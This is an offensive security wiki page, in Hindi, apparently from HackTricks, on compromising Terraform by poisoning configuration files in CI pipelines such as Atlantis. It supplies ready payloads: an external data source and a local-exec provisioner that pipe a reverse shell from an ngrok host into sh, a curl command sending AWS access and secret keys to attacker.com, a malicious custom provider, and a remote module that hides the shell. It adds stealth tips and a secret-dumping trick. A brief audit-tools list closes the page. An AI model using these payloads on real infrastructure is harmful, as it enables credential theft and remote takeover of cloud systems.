# Terraform рд╕реБрд░рдХреНрд╖рд╛

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

HashiCorp Terraform рдПрдХ **infrastructure as code tool** рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рджреЛрдиреЛрдВ **cloud рдФрд░ on-prem resources** рдХреЛ рдорд╛рдирд╡-рдкрдардиреАрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд╕рдВрд╕реНрдХрд░рдг, рдкреБрди: рдЙрдкрдпреЛрдЧ, рдФрд░ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдлрд┐рд░ рдПрдХ рд╕реБрд╕рдВрдЧрдд рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╕рднреА рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рдЙрд╕рдХреЗ рдЬреАрд╡рдирдЪрдХреНрд░ рдХреЗ рджреМрд░рд╛рди рдкреНрд░рд╛рд╡рдзрд╛рди рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред Terraform рдХрдореНрдкреНрдпреВрдЯ, рд╕реНрдЯреЛрд░реЗрдЬ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдЬреИрд╕реЗ рдирд┐рдореНрди-рд╕реНрддрд░реАрдп рдШрдЯрдХреЛрдВ рдХреЗ рд╕рд╛рде-рд╕рд╛рде DNS рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдФрд░ SaaS рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдЬреИрд╕реЗ рдЙрдЪреНрдЪ-рд╕реНрддрд░реАрдп рдШрдЯрдХреЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### Terraform рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ?

Terraform рдЙрдирдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдЗрдВрдЯрд░рдлреЗрд╕ (APIs) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрд▓рд╛рдЙрдб рдкреНрд▓реЗрдЯрдлреЙрд░реНрдореНрд╕ рдФрд░ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред Providers Terraform рдХреЛ рд╡рд╕реНрддреБрддрдГ рдХрд┐рд╕реА рднреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдпрд╛ рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдПрдХ рд╕реБрд▓рдн API рд╣реЛред

![](<../.gitbook/assets/image (33).png>)

HashiCorp рдФрд░ Terraform рд╕рдореБрджрд╛рдп рдкрд╣рд▓реЗ рд╣реА **1700 рд╕реЗ рдЕрдзрд┐рдХ providers** рд▓рд┐рдЦ рдЪреБрдХреЗ рд╣реИрдВ рдЬреЛ рд╣рдЬрд╛рд░реЛрдВ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рддреА рдЬрд╛ рд░рд╣реА рд╣реИред рдЖрдк [Terraform Registry](https://registry.terraform.io/) рдкрд░ рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдкрд▓рдмреНрдз providers рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, рдФрд░ рдмрд╣реБрдд рдХреБрдЫ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

Terraform рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХреЗ рддреАрди рдЪрд░рдг рд╣реЛрддреЗ рд╣реИрдВ:

* **рд▓рд┐рдЦреЗрдВ:** рдЖрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдХрдИ рдХреНрд▓рд╛рдЙрдб рдкреНрд░рджрд╛рддрд╛рдУрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ Virtual Private Cloud (VPC) рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдкрд░ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рдФрд░ рдПрдХ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рд╣реЛред
* **рдпреЛрдЬрдирд╛:** Terraform рдПрдХ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдпреЛрдЬрдирд╛ рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдореМрдЬреВрджрд╛ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдФрд░ рдЖрдкрдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдмрдирд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ, рдЕрдкрдбреЗрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ, рдпрд╛ рдирд╖реНрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХрд╛ рд╡рд░реНрдгрди рдХрд░рддрд╛ рд╣реИред
* **рд▓рд╛рдЧреВ рдХрд░реЗрдВ:** рдЕрдиреБрдореЛрджрди рдкрд░, Terraform рд╕рд╣реА рдХреНрд░рдо рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╕рдВрдЪрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рддреЗ рд╣реБрдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк VPC рдХреА рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ VPC рдореЗрдВ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ Terraform VPC рдХреЛ рдлрд┐рд░ рд╕реЗ рдмрдирд╛рдПрдЧрд╛ рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рд╡рд╣ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕реНрдХреЗрд▓ рдХрд░реЗред

![](<../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterprise рдЖрдкрдХреЛ `terraform plan` рдпрд╛ `terraform apply` рдЬреИрд╕реЗ **рдХрдорд╛рдВрдбреНрд╕ рдЪрд▓рд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдПрдХ **self-hosted version of Terraform Cloud** рдореЗрдВ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЙрд╕ Terraform рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП **API key** рдкрд╛ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕реЗ **compromise рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="broken-reference" %}
[рдЯреВрдЯрд╛ рд╣реБрдЖ рд▓рд┐рдВрдХ](broken-reference)
{% endcontent-ref %}

## Terraform Lab

рдмрд╕ рдЕрдкрдиреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдореЗрдВ terraform рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВред

рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ [рдЧрд╛рдЗрдб](https://learn.hashicorp.com/tutorials/terraform/install-cli) рд╣реИ рдФрд░ рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ terraform рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ [рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛](https://www.terraform.io/downloads) рд╣реИред

## Terraform рдореЗрдВ RCE

Terraform рдореЗрдВ рдХреЛрдИ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдирд╣реАрдВ рд╣реИ рдЬреЛ рдПрдХ рд╡реЗрдм рдкреЗрдЬ рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛ рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо рдЧрд┐рди рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, terraform рдХреЛ compromise рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ **terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛** рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, terraform рдПрдХ **рдмрд╣реБрдд рд╣реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдШрдЯрдХ** рд╣реИ рдЬрд┐рд╕реЗ compromise рдХрд░рдирд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдареАрдХ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкрд╣реБрдБрдЪ** рд░рдЦреЗрдЧрд╛ред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП terraform рдЪрд▓ рд░рд╣реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ compromise рдХрд░рдиреЗ рдХрд╛ рдореБрдЦреНрдп рддрд░реАрдХрд╛ **terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЛ compromise рдХрд░рдирд╛** рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдХрд┐рд╕реА рдмрд┐рдВрджреБ рдкрд░ рд╡реЗ **рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ**ред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рдРрд╕реЗ рд╕рдорд╛рдзрд╛рди рд╣реИрдВ рдЬреЛ **PR рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ terraform plan/apply рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ рдХрд┐ **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

рдпрджрд┐ рдЖрдк рдПрдХ terraform рдлрд╝рд╛рдЗрд▓ рдХреЛ compromise рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ рддреЛ рдЬрдм рдХреЛрдИ `terraform plan` рдпрд╛ `terraform apply` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ рддреЛ рдЖрдк RCE рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### Terraform plan

Terraform plan terraform рдореЗрдВ **рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдХрдорд╛рдВрдб** рд╣реИ рдФрд░ рдбреЗрд╡рд▓рдкрд░реНрд╕/рд╕рдорд╛рдзрд╛рди рдЬреЛ terraform рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рд╡реЗ рдЗрд╕реЗ рд╣рд░ рд╕рдордп рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ **рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛** рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЬрд╣рд░ рджреЗрдВ рдЬреЛ `terraform plan` рдореЗрдВ рдордирдорд╛рдиреЗ рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред

#### рдПрдХ рдмрд╛рд╣рд░реА рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

Terraform [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ Terraform рдФрд░ рдмрд╛рд╣рд░реА рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдХреЗ рдмреАрдЪ рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЖрдк `plan` рдХреЗ рджреМрд░рд╛рди рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП `external` рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХ terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ рдХреБрдЫ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рд╕реЗ `terraform plan` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдПрдХ rev shell рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### рдПрдХ рдХрд╕реНрдЯрдо рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдХреЛрдИ рднреА [рдХрд╕реНрдЯрдо рдкреНрд░реЛрд╡рд╛рдЗрдбрд░](https://learn.hashicorp.com/tutorials/terraform/provider-setup) рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ [Terraform Registry](https://registry.terraform.io/) рдкрд░ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЖрдк рдПрдХ рдирд┐рдЬреА рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗ рдХрд╕реНрдЯрдо рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдХреЛ рднреА рдЦреАрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдмрд╕ рдЗрддрдирд╛ рд╣реА:

* рдПрдХ рдХрд╕реНрдЯрдо рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рд▓рд┐рдЦреЗрдВ рдЬреЛ рдХреБрдЫ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдХреЛрдб рдЪрд▓рд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ рдЧреНрд░рд╛рд╣рдХ рдбреЗрдЯрд╛ рдХреА рдЪреЛрд░реА)
* рдЗрд╕реЗ Terraform Registry рдкрд░ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ
* рдлреАрдЪрд░ рдмреНрд░рд╛рдВрдЪ рдореЗрдВ Terraform рдХреЛрдб рдореЗрдВ рдкреНрд░реЛрд╡рд╛рдЗрдбрд░ рдЬреЛрдбрд╝реЗрдВ
* рдлреАрдЪрд░ рдмреНрд░рд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ PR рдЦреЛрд▓реЗрдВ
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
#### рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рджреЛрдиреЛрдВ рд╡рд┐рдХрд▓реНрдк рдЙрдкрдпреЛрдЧреА рд╣реИрдВ рд▓реЗрдХрд┐рди рдмрд╣реБрдд рдЧреБрдкреНрдд рдирд╣реАрдВ рд╣реИрдВ (рджреВрд╕рд░рд╛ рд╡рд┐рдХрд▓реНрдк рдЕрдзрд┐рдХ рдЧреБрдкреНрдд рд╣реИ рд▓реЗрдХрд┐рди рдкрд╣рд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИ)ред рдЖрдк рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдФрд░ рднреА **рдЧреБрдкреНрдд рддрд░реАрдХреЗ рд╕реЗ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

* рдЯреЗрд░рд╛рдлреЙрд░реНрдо рдлрд╛рдЗрд▓ рдореЗрдВ рд╕реАрдзреЗ рд░реЗрд╡ рд╢реЗрд▓ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдЖрдк рдПрдХ **рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рдореЗрдВ рд░реЗрд╡ рд╢реЗрд▓ рд╣реЛ:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
рдЖрдк rev shell рдХреЛрдб [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

* рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдореЗрдВ, **ref** рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░реЗрдкреЛ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ **terraform rev shell рдХреЛрдб рдХреЛ рдЫрд┐рдкрд╛рдПрдВ**, рдЬреИрд╕реЗ: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply рдХреЛ рд╕рднреА рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html) рдХреЗ рд╕рд╛рде **рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг Terraform рдлрд╝рд╛рдЗрд▓ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ** RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХреБрдЫ рдкреЗрд▓реЛрдб `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
**рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рд╕реЗ рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ** рдФрд░ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ **рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрднреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рдХ рдЪреБрдкрдХреЗ рд╕реЗ рдХрд░реЗрдВ**ред

## рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдбрдВрдкреНрд╕

рдЖрдк terraform рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ **рд╕реАрдХреНрд░реЗрдЯ рдорд╛рдиреЛрдВ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** `terraform apply` рдЪрд▓рд╛рдХрд░, terraform рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рдЬреЛрдбрд╝рдХрд░:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## рдСрдбрд┐рдЯ рдЯреВрд▓реНрд╕

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec рдЖрдкрдХреЗ terraform рдХреЛрдб рдХрд╛ рд╕реНрдЯреИрдЯрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* [**terascan**](https://github.com/tenable/terrascan): Terrascan Infrastructure as Code рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдЯреИрдЯрд┐рдХ рдХреЛрдб рд╡рд┐рд╢реНрд▓реЗрд╖рдХ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

